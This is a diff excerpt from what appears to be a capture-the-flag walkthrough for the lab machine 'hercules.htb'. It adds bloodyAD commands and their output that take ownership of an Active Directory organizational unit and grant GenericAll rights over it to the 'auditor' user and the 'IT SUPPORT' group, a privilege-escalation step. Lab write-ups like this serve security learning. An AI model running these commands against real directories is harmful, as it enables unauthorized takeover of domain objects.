@@ -1483,8 +1483,17 @@ This is true, any user thats ever part of a higher privileged group hold the att
 So maybe running this script will cause this attribute to be cleared since this is a `solution` 
 
 ```python
+bloodyAD --host dc.hercules.htb -d hercules.htb -k set owner 'OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb' 'auditor'
+[!] S-1-5-21-1889966460-2597381952-958560702-1128 is already the owner, no modification will be made
 
+bloodyAD --host dc.hercules.htb -d hercules.htb -k add genericAll 'OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb' 'auditor'
+[+] auditor has now GenericAll on OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
+
+bloodyAD --host dc.hercules.htb -d hercules.htb -k add genericAll 'OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb' 'IT SUPPORT'
+[+] IT SUPPORT has now GenericAll on OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
 ```
+
+First ill ensure the `auditor 
 
 
 
